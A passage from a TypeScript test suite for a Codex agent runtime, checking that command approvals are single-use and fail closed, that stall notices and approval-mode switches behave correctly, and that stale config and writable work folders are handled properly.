    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(77, 'item/commandExecution/requestApproval', {
      threadId: 'th_OTHER',
      command: 'evil',
    })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({ id: 77, result: { decision: 'decline' } })

    transport.serverRequest(77, 'item/commandExecution/requestApproval', { command: 'legit' })
    await new Promise((r) => setTimeout(r, 30))

    expect(cards(events), 'a spent id must not publish a card').toHaveLength(0)
    expect(transport.responses.filter((r) => r.id === 77)).toHaveLength(1)
    await handle.close()
    await consumer
  })

  it('F2: an id SPENT by an unsupported-method error serves NO second request', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequestRaw(950, 'item/future/requestSomething', { threadId: 'th_1' })
    await vi.waitFor(() => expect(transport.errors.length).toBe(1))

    transport.serverRequest(950, 'item/commandExecution/requestApproval', { command: 'legit' })
    await new Promise((r) => setTimeout(r, 30))

    expect(cards(events)).toHaveLength(0)
    expect(transport.responses.filter((r) => r.id === 950)).toHaveLength(0)
    await handle.close()
    await consumer
  })

  it('F2 reverse: a legit CLAIMED id is not burned by a later unsupported request for the same id', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(950, 'item/commandExecution/requestApproval', { command: 'legit' })
    await vi.waitFor(() => expect(cards(events).length).toBe(1))

    transport.serverRequestRaw(950, 'item/future/requestSomething', { threadId: 'th_1' })
    await new Promise((r) => setTimeout(r, 20))
    expect(transport.errors.filter((e) => e.id === 950)).toHaveLength(0)

    await handle.respondPermission('number:950', { outcome: 'allow' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({ id: 950, result: { decision: 'accept' } })
    await handle.close()
    await consumer
  })

  it('SINGLE-SHOT: a normal in-scope approval still resolves with exactly one accept', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(5, 'item/commandExecution/requestApproval', { command: 'ls' })
    await vi.waitFor(() => expect(cards(events).length).toBe(1))
    await handle.respondPermission('number:5', { outcome: 'allow' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses).toEqual([{ id: 5, result: { decision: 'accept' } }])
    await expect(handle.respondPermission('number:5', { outcome: 'allow' })).rejects.toThrow()
    await new Promise((r) => setTimeout(r, 20))
    expect(transport.responses.filter((r) => r.id === 5)).toHaveLength(1)
    await handle.close()
    await consumer
  })

  it('a user-input answer is atomic too: one response, and a late answer writes nothing', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(6, 'item/tool/requestUserInput', {
      questions: [{ id: 'q1', prompt: 'pick' }],
    })
    await vi.waitFor(() => expect(cards(events).length).toBe(1))
    await handle.respondUserInput('number:6', { kind: 'answer', answers: { q1: 'yes' } })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    await expect(
      handle.respondUserInput('number:6', { kind: 'answer', answers: { q1: 'no' } }),
    ).rejects.toThrow()
    await new Promise((r) => setTimeout(r, 20))
    expect(transport.responses.filter((r) => r.id === 6)).toHaveLength(1)
    await handle.close()
    await consumer
  })
})

describe('waiting on the user is not silence (076)', () => {
  async function awaitingAnswer() {
    const ctx = await startCodexInTurn()
    ctx.transport.serverRequest(11, 'item/tool/requestUserInput', {
      questions: [{ id: 'q1', prompt: 'which one?' }],
    })
    await vi.waitFor(has(ctx.events, (e) => e.type === 'user_input_request'))
    return ctx
  }

  it('the status is waiting_permission while a question is open, and the watchdog is disarmed', async () => {
    const { transport, handle, events, consumer } = await awaitingAnswer()

    expect(handle.status()).toBe('waiting_permission')
    expect(events.filter((e) => e.type === 'user_input_request')).toHaveLength(1)
    const watchdog = (handle as unknown as { stallWatchdog: { armed: boolean } }).stallWatchdog
    expect(watchdog.armed, 'the watchdog must be disarmed while waiting on the user').toBe(false)

    await handle.respondUserInput('number:11', { kind: 'answer', answers: { q1: 'a' } })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    await handle.close()
    await consumer
  })

  it('no stall ping fires while the user is thinking', async () => {
    const { handle, events, consumer } = await awaitingAnswer()

    const withStall = handle as unknown as { reportStall(ms: number): void }
    withStall.reportStall(120_000)
    await new Promise((r) => setTimeout(r, 20))

    expect(
      events.filter((e) => e.type === 'error' && /no activity/.test(e.message)),
      'no stall ping may fire while a question is open',
    ).toHaveLength(0)

    await handle.close()
    await consumer
  })

  it('after the answer the status returns to working and a GENUINE stall still pings', async () => {
    const { transport, handle, events, consumer } = await awaitingAnswer()
    await handle.respondUserInput('number:11', { kind: 'answer', answers: { q1: 'a' } })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    await vi.waitFor(() => expect(handle.status()).toBe('working'))

    const withStall = handle as unknown as { reportStall(ms: number): void }
    withStall.reportStall(120_000)
    await vi.waitFor(has(events, (e) => e.type === 'error' && /no activity/.test(e.message)))

    await handle.close()
    await consumer
  })
})

describe('a silence after reasoning is said as thinking (F145)', () => {
  async function silenceAfter(method: string, params: Record<string, unknown>): Promise<string[]> {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    vi.useFakeTimers()
    try {
      transport.notification(method, { threadId: 'th_1', turnId: 'tn_1', ...params })
      await vi.advanceTimersByTimeAsync(121_000)
      return events
        .filter((e) => e.type === 'error')
        .map((e) => (e.type === 'error' ? e.message : ''))
    } finally {
      vi.useRealTimers()
      await handle.close()
      await consumer
    }
  }

  it('after a reasoning summary, two silent minutes read "Still thinking (2 min)."', async () => {
    expect(
      await silenceAfter('item/reasoning/summaryTextDelta', {
        itemId: 'rs_1',
        summaryIndex: 0,
        delta: 'weighing it',
      }),
    ).toEqual(['Still thinking (2 min).'])
  })

  it("after the model's words, the same silence keeps today's notice", async () => {
    const said = await silenceAfter('item/agentMessage/delta', { itemId: 'm1', delta: 'hi' })
    expect(said).toHaveLength(1)
    expect(said[0]).toMatch(/^still working — no activity for 120s\..*you can interrupt\.$/)
  })

  it('the thinking notice is said once: it neither re-arms the watchdog nor forgets the reasoning', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    vi.useFakeTimers()
    const stalls = () =>
      events.flatMap((e) =>
        e.type === 'error' ? [{ message: e.message, stall: e.stall, thinking: e.thinking }] : [],
      )
    try {
      transport.notification('item/reasoning/summaryTextDelta', {
        threadId: 'th_1',
        turnId: 'tn_1',
        itemId: 'rs_1',
        summaryIndex: 0,
        delta: 'weighing it',
      })
      await vi.advanceTimersByTimeAsync(121_000)
      expect(stalls()).toEqual([
        { message: 'Still thinking (2 min).', stall: true, thinking: true },
      ])
      await vi.advanceTimersByTimeAsync(120_000)
      expect(stalls(), 'the notice re-armed the watchdog').toEqual([
        { message: 'Still thinking (2 min).', stall: true, thinking: true },
      ])

      transport.notification('item/agentMessage/delta', {
        threadId: 'th_1',
        turnId: 'tn_1',
        itemId: 'm1',
        delta: 'hi',
      })
      await vi.advanceTimersByTimeAsync(121_000)
      expect(stalls()).toHaveLength(2)
      expect(stalls()[1]?.message).toMatch(/^still working — no activity for 120s\./)
      expect(stalls()[1]?.thinking).toBeUndefined()
    } finally {
      vi.useRealTimers()
      await handle.close()
      await consumer
    }
  })
})

describe('auto-approve mode — Codex (078)', () => {
  async function startWith(approvalMode?: 'ask' | 'auto') {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () =>
      approvalMode === 'auto'
        ? ({
            ...okThread('th_1'),
            approvalPolicy: 'never',
            approvalsReviewer: 'user',
            sandbox: { type: 'dangerFullAccess' },
          } as Record<string, unknown>)
        : okThread('th_1'),
    )
    const runtime = new CodexRuntime(adopt(transport))
    const handle = await runtime.start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
      ...(approvalMode ? { approvalMode } : {}),
    })
    return { transport, handle }
  }

  const startParams = (transport: FakeTransport) =>
    transport.requests.find((r) => r.method === 'thread/start')?.params as Record<string, unknown>

  it('ASK is unchanged — the prompting profile, by default and when asked for', async () => {
    for (const mode of [undefined, 'ask' as const]) {
      const { transport, handle } = await startWith(mode)
      expect(startParams(transport)).toMatchObject({
        approvalPolicy: 'on-request',
        approvalsReviewer: 'user',
        sandbox: 'workspace-write',
      })
      await handle.close()
    }
  })

  it('AUTO starts the thread with never + danger-full-access, and the validator ACCEPTS it', async () => {
    const { transport, handle } = await startWith('auto')
    expect(startParams(transport)).toMatchObject({
      approvalPolicy: 'never',
      approvalsReviewer: 'user',
      sandbox: 'danger-full-access',
    })
    expect(handle.ref?.sessionId).toBe('th_1')
    await handle.close()
  })

  describe('and it behaves like the CLI, which is what `danger-full-access` buys (160)', () => {
    it('⚑ AUTO carries NO permissions profile — the field 157 added is gone from every request', async () => {
      const { transport, handle } = await startWith('auto')
      await handle.send('go')
      const carrying = transport.requests.filter(
        (r) => (r.params as Record<string, unknown>)?.['permissions'] !== undefined,
      )
      expect(carrying.map((r) => r.method)).toEqual([])
      expect(transport.requests.map((r) => r.method)).toEqual(
        expect.arrayContaining(['thread/start', 'turn/start']),
      )
      await handle.close()
    })

    it('⚑ …and neither does ASK, whose behaviour did not move through either change', async () => {
      const { transport, handle } = await startWith('ask')
      await handle.send('go')
      expect(
        transport.requests.filter(
          (r) => (r.params as Record<string, unknown>)?.['permissions'] !== undefined,
        ),
      ).toEqual([])
      expect(startParams(transport)).toMatchObject({
        approvalPolicy: 'on-request',
        approvalsReviewer: 'user',
        sandbox: 'workspace-write',
      })
      await handle.close()
    })

    it('⛔ Codex is handed no path policy and no permissions profile — its sandbox mode is the whole of it', async () => {
      const { transport, handle } = await startWith('auto')
      await handle.send('go')
      const wire = JSON.stringify(transport.requests)
      expect(wire).not.toContain('permissions')
      expect(wire).toContain('danger-full-access')
      await handle.close()
    })
  })

  describe('a home carrying 157’s stale `[permissions.*]` block (160 §2)', () => {
    let home: string

    beforeEach(() => {
      home = mkdtempSync(join(tmpdir(), 'brobot2-stale-launch-'))
    })

    afterEach(() => {
      rmSync(home, { recursive: true, force: true })
    })

    const STALE = '# Generated by BroBot2 — rewritten on every session launch. Do not edit.\n'

    for (const mode of ['ask', 'auto'] as const) {
      it(`⛔ STILL LAUNCHES — in ${mode}`, async () => {
        writeFileSync(join(home, 'config.toml'), STALE)
        const transport = new FakeTransport()
        transport.onRequest('thread/start', () =>
          mode === 'auto'
            ? ({
                ...okThread('th_1'),
                approvalPolicy: 'never',
                approvalsReviewer: 'user',
                sandbox: { type: 'dangerFullAccess' },
              } as Record<string, unknown>)
            : okThread('th_1'),
        )
        const handle = await new CodexRuntime(adopt(transport)).start({
          cwd: '/tmp/x',
          providerHome: home,
          approvalMode: mode,
        })
        expect(handle.ref?.sessionId).toBe('th_1')
        await handle.close()
      })
    }

    it('⚑ …and the block is gone BEFORE the spawn, not after it', async () => {
      const config = join(home, 'config.toml')
      writeFileSync(config, STALE)
      let atSpawn: string | null = null
      const transport = new FakeTransport()
      transport.codexHome = home
      transport.onRequest('thread/start', () => okThread('th_1'))
      const handle = await new CodexRuntime(() => {
        atSpawn = existsSync(config) ? readFileSync(config, 'utf8') : null
        return transport
      }).start({ cwd: '/tmp/x', providerHome: home })
      expect(atSpawn, "157's block must already be gone when the transport is built").not.toContain(
        '# Generated by BroBot2',
      )
      expect(atSpawn, '…and 314’s gates must already be in it').toContain('memories = true')
      await handle.close()
    })

    it('⛔ …and even when its TOML no longer PARSES — 168 M4', async () => {
      const config = join(home, 'config.toml')
      writeFileSync(config, `${STALE}[permissions.deny\nthis = "is not toml\n`)
      const transport = new FakeTransport()
      transport.onRequest('thread/start', () => okThread('th_1'))
      const handle = await new CodexRuntime(adopt(transport)).start({
        cwd: '/tmp/x',
        providerHome: home,
      })
      expect(handle.ref?.sessionId).toBe('th_1')
      const after = readFileSync(config, 'utf8')
      expect(after, 'the unparseable block is gone, not merely stepped over').not.toContain(
        'permissions.deny',
      )
      expect(after).not.toContain('# Generated by BroBot2')
      expect(after).toContain('dedicated_tools = true')
      await handle.close()
    })

    it('⚑ …but an unparseable config that is NOT ours still fails the launch closed', async () => {
      const config = join(home, 'config.toml')
      writeFileSync(config, '[permissions.deny\nthis = "is not toml\n')
      const transport = new FakeTransport()
      transport.onRequest('thread/start', () => okThread('th_1'))
      await expect(
        new CodexRuntime(adopt(transport)).start({ cwd: '/tmp/x', providerHome: home }),
      ).rejects.toThrow(/could not be parsed/)
      expect(existsSync(config), 'left strictly alone').toBe(true)
    })

    it('⚑ a RESUME clears it too — the path a 157-era home is most likely to arrive by', async () => {
      const config = join(home, 'config.toml')
      writeFileSync(config, STALE)
      const transport = new FakeTransport()
      transport.onRequest('thread/resume', () => okThread('th_1'))
      const handle = await new CodexRuntime(adopt(transport)).resume(
        { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 0 },
        { providerHome: home },
      )
      const after = readFileSync(config, 'utf8')
      expect(after).not.toContain('# Generated by BroBot2')
      expect(after).toContain('memories = true')
      await handle.close()
    })

    it('🔒 …but a config this app did NOT generate is MERGED into, never deleted or replaced', async () => {
      const config = join(home, 'config.toml')
      const theirs =
        'model = "gpt-5"\n\n[projects."/Users/someone/dev/thing"]\ntrust_level = "trusted"\n'
      writeFileSync(config, theirs)
      const transport = new FakeTransport()
      transport.onRequest('thread/start', () => okThread('th_1'))
      const handle = await new CodexRuntime(adopt(transport)).start({
        cwd: '/tmp/x',
        providerHome: home,
      })
      const after = readFileSync(config, 'utf8')
      expect(after).toContain('model = "gpt-5"')
      expect(after).toContain('[projects."/Users/someone/dev/thing"]\ntrust_level = "trusted"')
      expect(after).toContain('memories = true')
      await handle.close()
    })
  })

  it('ASK still REJECTS a `never` profile — 007 P1-6 is intact', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({
      ...okThread('th_1'),
      approvalPolicy: 'never',
      sandbox: { type: 'dangerFullAccess' },
    }))
    await expect(
      new CodexRuntime(adopt(transport)).start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' }),
    ).rejects.toThrow(/approval profile/i)
  })

  it('AUTO rejects a PARTIAL downgrade — approvals off but the sandbox still on', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({
      ...okThread('th_1'),
      approvalPolicy: 'never',
      sandbox: { type: 'workspaceWrite' },
    }))
    await expect(
      new CodexRuntime(adopt(transport)).start({
        cwd: '/tmp/x',
        providerHome: '/tmp/x/home',
        approvalMode: 'auto',
      }),
    ).rejects.toThrow(/approval profile/i)
  })

  it('a RESUMED session re-applies its mode on thread/resume', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => ({
      ...okThread('th_1'),
      approvalPolicy: 'never',
      approvalsReviewer: 'user',
      sandbox: { type: 'dangerFullAccess' },
    }))
    const handle = await new CodexRuntime(adopt(transport)).resume(
      { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 0 },
      { providerHome: '/tmp/x/home', approvalMode: 'auto' },
    )
    const resumeParams = transport.requests.find((r) => r.method === 'thread/resume')?.params
    expect(resumeParams).toMatchObject({
      approvalPolicy: 'never',
      sandbox: 'danger-full-access',
    })
    await handle.close()
  })
})

describe('switching the approval mode mid-conversation — Codex (034)', () => {
  const turnParams = (transport: FakeTransport) =>
    transport.requests
      .filter((r) => r.method === 'turn/start')
      .map((r) => r.params as Record<string, unknown>)

  const WORKSPACE_WRITE_ECHOED = {
    type: 'workspaceWrite',
    writableRoots: [],
    networkAccess: false,
    excludeTmpdirEnvVar: false,
    excludeSlashTmp: false,
  }

  async function inTurn(approvalMode?: 'ask' | 'auto') {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () =>
      approvalMode === 'auto'
        ? ({
            ...okThread('th_1'),
            approvalPolicy: 'never',
            approvalsReviewer: 'user',
            sandbox: { type: 'dangerFullAccess' },
          } as Record<string, unknown>)
        : okThread('th_1'),
    )
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
      ...(approvalMode ? { approvalMode } : {}),
    })
    return { transport, handle }
  }

  it('EVERY turn re-pins the whole profile, not just the reviewer', async () => {
    const { transport, handle } = await inTurn()
    await handle.send('one')
    expect(turnParams(transport)[0]).toMatchObject({
      approvalPolicy: 'on-request',
      approvalsReviewer: 'user',
      sandboxPolicy: WORKSPACE_WRITE_ECHOED,
    })
    await handle.close()
  })

  it('a requested change does NOT touch the turn already running', async () => {
    const { transport, handle } = await inTurn()
    await handle.send('one')
    await handle.setApprovalMode('auto')

    expect(handle.approval).toEqual({ effective: 'ask', requested: 'auto' })
    expect(transport.requests.filter((r) => r.method === 'thread/settings/update')).toHaveLength(0)
    const events: RuntimeEvent[] = []
    const consumer = collect(handle, events)
    transport.serverRequest(1, 'item/commandExecution/requestApproval', { command: 'ls' })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    expect(firstOfType(events, 'permission_request').scope.approvalMode).toBe('ask')
    await handle.close()
    await consumer
  })

  it('the NEXT turn carries it, and it is effective from the moment it is sent', async () => {
    const { transport, handle } = await inTurn()
    await handle.send('one')
    await handle.setApprovalMode('auto')
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn(transport.lastTurnId)),
    )
    await vi.waitFor(() => expect(handle.status()).toBe('idle'))

    await handle.send('two')
    expect(turnParams(transport)[1]).toMatchObject({
      approvalPolicy: 'never',
      approvalsReviewer: 'user',
      sandboxPolicy: { type: 'dangerFullAccess' },
    })
    expect(handle.approval).toEqual({ effective: 'auto', requested: 'auto' })
    await handle.close()
  })

  it('switches back, and the reverse direction is not special', async () => {
    const { transport, handle } = await inTurn('auto')
    await handle.setApprovalMode('ask')
    expect(handle.approval).toEqual({ effective: 'auto', requested: 'ask' })
    await handle.send('one')
    expect(turnParams(transport)[0]).toMatchObject({
      approvalPolicy: 'on-request',
      sandboxPolicy: WORKSPACE_WRITE_ECHOED,
    })
    expect(handle.approval.effective).toBe('ask')
    await handle.close()
  })

  it('only the exact string turns approvals off', async () => {
    const { handle } = await inTurn()
    await handle.setApprovalMode('AUTO' as 'auto')
    expect(handle.approval.requested).toBe('ask')
    await handle.close()
  })

  it('the mid-session settings guard follows the NEW mode once it is adopted', async () => {
    const { transport, handle } = await inTurn()
    const events: RuntimeEvent[] = []
    const consumer = collect(handle, events)
    await handle.setApprovalMode('auto')
    await handle.send('one')
    transport.notification('thread/settings/updated', {
      threadId: 'th_1',
      threadSettings: {
        approvalPolicy: 'never',
        approvalsReviewer: 'user',
        sandboxPolicy: { type: 'dangerFullAccess' },
      },
    })
    await new Promise((r) => setTimeout(r, 10))
    expect(events.filter((e) => e.type === 'error')).toHaveLength(0)
    expect(handle.status()).not.toBe('errored')
    await handle.close()
    await consumer
  })

  it('still fails closed when the provider moves to a profile NOBODY asked for', async () => {
    const { transport, handle } = await inTurn()
    const events: RuntimeEvent[] = []
    const consumer = collect(handle, events)
    await handle.send('one')
    transport.notification('thread/settings/updated', {
      threadId: 'th_1',
      threadSettings: {
        approvalPolicy: 'never',
        approvalsReviewer: 'user',
        sandboxPolicy: { type: 'dangerFullAccess' },
      },
    })
    await vi.waitFor(has(events, (e) => e.type === 'error' && e.fatal === true))
    expect(events.some((e) => e.type === 'status' && e.state === 'errored')).toBe(true)
    await consumer
  })

  it('a turn/start that FAILS un-adopts the mode it was carrying (034 review)', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1'))
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
    })
    transport.failRequest('turn/start')
    await handle.setApprovalMode('auto')
    await handle.send('one')
    await vi.waitFor(() => expect(handle.approval.effective).toBe('ask'))
    expect(handle.approval).toEqual({ effective: 'ask', requested: 'auto' })
    await handle.close()
  })

  it('the per-turn sandbox re-pin echoes the SERVER’s workspaceWrite policy, not our guess (034 review)', async () => {
    const echoed = {
      type: 'workspaceWrite',
      writableRoots: ['/tmp/also'],
      networkAccess: true,
      excludeTmpdirEnvVar: true,
      excludeSlashTmp: true,
    }
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({ ...okThread('th_1'), sandbox: echoed }))
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
    })
    await handle.send('one')
    expect(turnParams(transport)[0]?.['sandboxPolicy']).toEqual(echoed)
    await handle.close()
  })

  it('…and it keeps following the server when the settings change (034 review)', async () => {
    const { transport, handle } = await inTurn()
    await handle.send('one')
    expect(turnParams(transport)[0]).toMatchObject({ sandboxPolicy: WORKSPACE_WRITE_ECHOED })
    const updated = { ...WORKSPACE_WRITE_ECHOED, writableRoots: ['/tmp/also'], networkAccess: true }
    transport.notification('thread/settings/updated', {
      threadId: 'th_1',
      threadSettings: {
        approvalPolicy: 'on-request',
        approvalsReviewer: 'user',
        sandboxPolicy: updated,
      },
    })
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn(transport.lastTurnId)),
    )
    await vi.waitFor(() => expect(handle.status()).toBe('idle'))
    await handle.send('two')
    expect(turnParams(transport)[1]?.['sandboxPolicy']).toEqual(updated)
    await handle.close()
  })

  it('a dangerFullAccess echo teaches it nothing about workspaceWrite (034 review)', async () => {
    const { transport, handle } = await inTurn()
    await handle.setApprovalMode('auto')
    await handle.send('one')
    transport.notification('thread/settings/updated', {
      threadId: 'th_1',
      threadSettings: {
        approvalPolicy: 'never',
        approvalsReviewer: 'user',
        sandboxPolicy: { type: 'dangerFullAccess' },
      },
    })
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn(transport.lastTurnId)),
    )
    await vi.waitFor(() => expect(handle.status()).toBe('idle'))
    await handle.setApprovalMode('ask')
    await handle.send('two')
    expect(turnParams(transport)[1]).toMatchObject({ sandboxPolicy: WORKSPACE_WRITE_ECHOED })
    await handle.close()
  })
})

describe('W4.189 · work folders are writable roots of the ask sandbox — Codex', () => {
  const turnParams = (transport: FakeTransport) =>
    transport.requests
      .filter((r) => r.method === 'turn/start')
      .map((r) => r.params as Record<string, unknown>)
  const sandboxOf = (transport: FakeTransport, turn: number) =>
    turnParams(transport)[turn]?.['sandboxPolicy']
  const configOf = (transport: FakeTransport, method: 'thread/start' | 'thread/resume') =>
    (transport.requests.find((r) => r.method === method)?.params as { config?: unknown }).config
  const ECHOED = {
    type: 'workspaceWrite',
    writableRoots: [] as string[],
    networkAccess: false,
    excludeTmpdirEnvVar: false,
    excludeSlashTmp: false,
  }
  const AUTO_ECHO = {
    approvalPolicy: 'never',
    approvalsReviewer: 'user',
    sandbox: { type: 'dangerFullAccess' },
  }

  async function launch(
    opts: {
      approvalMode?: 'ask' | 'auto'
      workFolders?: readonly string[]
      echoed?: Record<string, unknown>
    } = {},
  ) {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({
      ...okThread('th_1'),
      ...(opts.approvalMode === 'auto' ? AUTO_ECHO : {}),
      ...(opts.echoed ? { sandbox: opts.echoed } : {}),
    }))
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
      ...(opts.approvalMode ? { approvalMode: opts.approvalMode } : {}),
      ...(opts.workFolders ? { workFolders: opts.workFolders } : {}),
    })
    return { transport, handle }
  }

  async function endTurn(transport: FakeTransport, handle: SessionHandle): Promise<void> {
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn(transport.lastTurnId)),
    )
    await vi.waitFor(() => expect(handle.status()).toBe('idle'))
  }

  function echo(transport: FakeTransport, sandboxPolicy: Record<string, unknown>): void {
    transport.notification('thread/settings/updated', {
      threadId: 'th_1',
      threadSettings: { approvalPolicy: 'on-request', approvalsReviewer: 'user', sandboxPolicy },
    })
  }

  it('🔴 a launch’s work folders are writable roots of its first turn — and of the thread it opened', async () => {
    const { transport, handle } = await launch({ workFolders: ['/w/a', '/w/b'] })
    expect(configOf(transport, 'thread/start'), 'the thread’s own sandbox agrees').toEqual({
      ...EVERY_THREAD_OVERLAY,
      'sandbox_workspace_write.writable_roots': ['/w/a', '/w/b'],
    })
    expect(handle.workFolders).toEqual({ effective: ['/w/a', '/w/b'], requested: ['/w/a', '/w/b'] })
    await handle.send('one')
    expect(sandboxOf(transport, 0)).toEqual({ ...ECHOED, writableRoots: ['/w/a', '/w/b'] })
    await handle.close()
  })

  it('⚑ THE CONTROL — no work folder: the overlay names no roots, and the turn re-pins the echo as it was', async () => {
    const { transport, handle } = await launch()
    expect(configOf(transport, 'thread/start')).toEqual({ ...EVERY_THREAD_OVERLAY })
    await handle.send('one')
    expect(sandboxOf(transport, 0)).toEqual(ECHOED)
    expect(handle.workFolders).toEqual({ effective: [], requested: [] })
    await handle.close()
  })

  it('⛔ auto carries none — no overlay key, and `dangerFullAccess` alone on the turn', async () => {
    const { transport, handle } = await launch({ approvalMode: 'auto', workFolders: ['/w/a'] })
    expect(configOf(transport, 'thread/start')).toEqual({ ...EVERY_THREAD_OVERLAY })
    await handle.send('one')
    expect(sandboxOf(transport, 0)).toEqual({ type: 'dangerFullAccess' })
    expect(handle.workFolders.effective).toEqual(['/w/a'])
    await handle.setApprovalMode('ask')
    await endTurn(transport, handle)
    await handle.send('two')
    expect(sandboxOf(transport, 1)).toEqual({ ...ECHOED, writableRoots: ['/w/a'] })
    await handle.close()
  })

  it('🔴 a change mid-turn rides the NEXT turn, never the one running — and nothing goes on the wire for it', async () => {
    const { transport, handle } = await launch()
    await handle.send('one')
    handle.setWorkFolders(['/w/a'])
    expect(handle.workFolders).toEqual({ effective: [], requested: ['/w/a'] })
    expect(transport.requests.filter((r) => r.method === 'thread/settings/update')).toHaveLength(0)
    await endTurn(transport, handle)
    await handle.send('two')
    expect(sandboxOf(transport, 1)).toEqual({ ...ECHOED, writableRoots: ['/w/a'] })
    expect(handle.workFolders).toEqual({ effective: ['/w/a'], requested: ['/w/a'] })
    await handle.close()
  })

  it('⛔ a turn/start that FAILS un-adopts the list it was carrying, and keeps it asked for', async () => {
    const { transport, handle } = await launch({ workFolders: ['/w/a'] })
    transport.failRequest('turn/start')
    handle.setWorkFolders(['/w/a', '/w/b'])
    await handle.send('one')
    expect(sandboxOf(transport, 0), 'it was sent').toEqual({
      ...ECHOED,
      writableRoots: ['/w/a', '/w/b'],
    })
    await vi.waitFor(() => expect(handle.workFolders.effective).toEqual(['/w/a']))
    expect(handle.workFolders.requested, 'the person’s choice did not fail — the turn did').toEqual(
      ['/w/a', '/w/b'],
    )
    await handle.close()
  })

  it('🔴 THE BASELINE TRAP — a folder taken away is gone from the next turn, though the server echoed it back', async () => {
    const { transport, handle } = await launch()
    handle.setWorkFolders(['/w/a', '/w/b'])
    await handle.send('one')
    echo(transport, { ...ECHOED, writableRoots: ['/w/a', '/w/b'] })
    await endTurn(transport, handle)

    handle.setWorkFolders(['/w/b'])
    await handle.send('two')
    expect(sandboxOf(transport, 1)).toEqual({ ...ECHOED, writableRoots: ['/w/b'] })
    echo(transport, { ...ECHOED, writableRoots: ['/w/b'] })
    await endTurn(transport, handle)

    handle.setWorkFolders([])
    await handle.send('three')
    expect(sandboxOf(transport, 2)).toEqual(ECHOED)
    await handle.close()
  })

  it('🔴 …and a folder the LAUNCH named, which the handshake echoed, is taken away the same way', async () => {
    const { transport, handle } = await launch({
      workFolders: ['/w/a'],
      echoed: { ...ECHOED, writableRoots: ['/w/a'] },
    })
    handle.setWorkFolders([])
    await handle.send('one')
    expect(sandboxOf(transport, 0)).toEqual(ECHOED)
    await handle.close()
  })

  it('⚑ a root the thread had BEFORE any work folder is the thread’s own — a grant of the same path ending leaves it', async () => {
    const { transport, handle } = await launch({ echoed: { ...ECHOED, writableRoots: ['/w/own'] } })
    handle.setWorkFolders(['/w/own', '/w/a'])
    await handle.send('one')
    expect(sandboxOf(transport, 0), 'once each').toEqual({
      ...ECHOED,
      writableRoots: ['/w/own', '/w/a'],
    })
    echo(transport, { ...ECHOED, writableRoots: ['/w/own', '/w/a'] })
    await endTurn(transport, handle)
    handle.setWorkFolders([])
    await handle.send('two')
    expect(sandboxOf(transport, 1)).toEqual({ ...ECHOED, writableRoots: ['/w/own'] })
    await handle.close()
  })

  it('⚑ the server’s network and temp-dir flags ride through every change, as it reported them', async () => {
    const flags = { networkAccess: true, excludeTmpdirEnvVar: true, excludeSlashTmp: true }
    const { transport, handle } = await launch({
      workFolders: ['/w/a'],
      echoed: { ...ECHOED, ...flags, writableRoots: ['/w/a'] },
    })
    await handle.send('one')
    expect(sandboxOf(transport, 0)).toEqual({ ...ECHOED, ...flags, writableRoots: ['/w/a'] })
    await endTurn(transport, handle)
    handle.setWorkFolders([])
    await handle.send('two')
    expect(sandboxOf(transport, 1)).toEqual({ ...ECHOED, ...flags, writableRoots: [] })
    await handle.close()
  })

  it('🔴 a RESUME names them on the thread again — beside the effort the overlay already carries', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => okThread('th_1'))
    const handle = await new CodexRuntime(adopt(transport)).resume(
      { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 0 },
      { providerHome: '/tmp/x/home', workFolders: ['/w/a'], reasoningEffort: 'high' },
    )
    expect(configOf(transport, 'thread/resume')).toEqual({
      ...EVERY_THREAD_OVERLAY,
      'sandbox_workspace_write.writable_roots': ['/w/a'],
      model_reasoning_effort: 'high',
    })
    expect(handle.workFolders.effective).toEqual(['/w/a'])
    await handle.send('one')
    expect(sandboxOf(transport, 0)).toEqual({ ...ECHOED, writableRoots: ['/w/a'] })
    await handle.close()
  })

  it('⛔ …and an `auto` resume does not', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => ({ ...okThread('th_1'), ...AUTO_ECHO }))
    const handle = await new CodexRuntime(adopt(transport)).resume(
